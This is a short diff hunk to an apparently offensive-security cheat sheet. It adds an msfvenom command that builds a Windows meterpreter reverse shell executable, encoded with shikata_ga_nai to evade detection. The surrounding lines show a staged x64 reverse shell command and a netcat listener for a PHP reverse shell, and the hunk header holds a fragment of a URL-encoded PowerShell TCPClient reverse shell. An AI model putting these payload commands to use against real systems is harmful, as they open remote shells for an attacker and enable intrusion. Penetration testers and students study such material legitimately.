@@ -19,6 +19,7 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 * ```msfvenom -p <PAYLOAD> <OPTIONS>``` Standard syntax.
 * ```<OS>/<arch>/<payload>``` Basic convention.
 * ```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>``` Windows x64 Reverse Shell in an exe format (staged).
+* ```msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe``` Windows x86 Reverse Shell with encoding.
 
 ### Simple example of a PHP reverse shell.
 * Start you listener. ```nc -lvnp <PORT>```
